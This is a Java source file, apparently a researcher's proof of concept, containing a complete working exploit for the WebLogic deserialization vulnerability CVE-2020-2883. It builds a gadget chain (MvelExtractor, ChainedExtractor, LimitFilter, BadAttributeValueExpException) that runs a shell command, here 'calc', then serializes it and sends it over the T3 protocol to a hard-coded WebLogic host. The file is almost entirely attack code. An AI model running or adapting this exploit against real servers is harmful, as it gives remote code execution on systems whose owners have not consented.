
package com.supeream;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/**
 * @author ga0weI
 * @time 20220607
 * @work: Exploit cve-2020-2883 vulnerability to attack WebLogic Serve
 */

public class CVE_2020_2883_1 {
    public static void main(String[] args) throws Exception{
        //直接初始化的时候将MvelExtractor的sExpr赋值为我们想要编译执行的语句
        MvelExtractor mvelExtractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"calc\");");


        //下面的就和cve-2020-2555一模一样了
        ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{mvelExtractor});
        LimitFilter limitFilter = new LimitFilter();

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, String.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, limitFilter);


        byte[] payload = Serializables.serialize(badAttributeValueExpException);

        // T3 send, you can also use python weblogic_t3.py test.ser
        T3ProtocolOperation.send("192.168.129.143", "7001", payload);



    }
}